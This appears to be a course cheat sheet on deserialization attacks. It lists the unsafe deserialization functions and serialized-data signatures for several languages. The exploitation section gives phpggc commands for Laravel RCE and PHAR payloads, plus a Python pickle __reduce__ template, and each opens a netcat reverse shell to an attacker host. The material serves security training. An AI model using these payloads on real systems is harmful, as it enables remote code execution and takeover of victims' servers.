title: Introduction to Deserialization Attacks
html:
Introduction to Deserialization Attacks

White-Box

Language

Function

PHP

unserialize()

Python (Pickle)

pickle.loads()

Python (JSONPickle)

jsonpickle.loads()

Python (PyYAML, ruamel.yaml)

yaml.load()

Java

readObject()

C#/.NET

Deserialize()

Ruby

Marshal.load()

Black Box

Language

Bytes

PHP

a:4:{i:0;s:4:"Test";i:1;s:4:"Data";i:2;a:1:{i:0;i:4;}i:3;s:7:"ACADEMY";}

Python 2.x (Pickle Protocol 0)

(lp0\nS'Test'\np1\naS'Data'\np2\na(lp3\nI4\naaS'ACADEMY'\np4\na.

Python 2.x (Pickle Protocol 1)

`80 01` (Hex)

Python 2.3+ (Pickle Protocol 2)

`80 02` (Hex)

Python 3.8+ (Pickle Protocol 4)

`80 03` (Hex)

Python 3.x (Pickle Protocol 5)

`80 04 95` (Hex)

Python 2.7 / 3.6+ (JSONPickle

["Test", "Data", [4], "ACADEMY"]

Python 3.6+ (PyYAML / ruamel.yaml)

- Test\n- Data\n- - 4\n- ACADEMY\n

Java

`AC ED 00 05 73 72` (Hex), `rO0ABXNy` (Base64)

C#/.NET

`00 01 00 00 00 ff ff ff ff` (Hex), `AAEAAAD/////` (Base64)

Ruby

`04 08` (Hex)

Exploiting PHP Deserialization

PHPGGC

Code: bash ```bash

List out available gadget chains for a specific framework:

phpggc -l Laravel

Generate an RCE payload using a specific gadget chain:

phpggc Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -b

Generate a payload to exploit a PHAR deserialization vulnerability:

phpggc -p phar Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 9999 -e /bin/bash' -o exploit.phar ```

Exploiting Python Deserialization

Code: python ```python

Template for Pickle RCE exploit:

import pickle import base64 import os class RCE: def __reduce__(self): return os.system, ("nc -nv 1.2.3.4 5555 -e /bin/bash",) print(base64.b64encode(pickle.dumps(RCE())).decode()) ```
